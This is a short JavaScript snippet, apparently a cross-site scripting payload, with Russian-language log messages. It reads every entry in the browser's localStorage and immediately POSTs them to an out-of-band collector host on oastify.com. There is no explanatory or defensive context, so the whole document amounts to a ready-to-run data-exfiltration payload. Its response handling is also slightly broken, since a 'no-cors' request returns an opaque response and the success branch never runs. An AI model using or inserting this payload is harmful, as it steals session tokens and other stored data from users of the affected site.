function sendLocalStorageToServer(url) {
  const data = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
  }

  fetch(url, {
    method: 'POST',
    mode: 'no-cors',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      console.log('Данные успешно отправлены');
      return response.json();
    }
    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
  })
  .then(result => console.log('Ответ сервера:', result))
  .catch(error => console.error('Ошибка отправки:', error));
}

sendLocalStorageToServer('https://1cejbybos1mi4gonat0t15vuslycm2ar.oastify.com/storage');
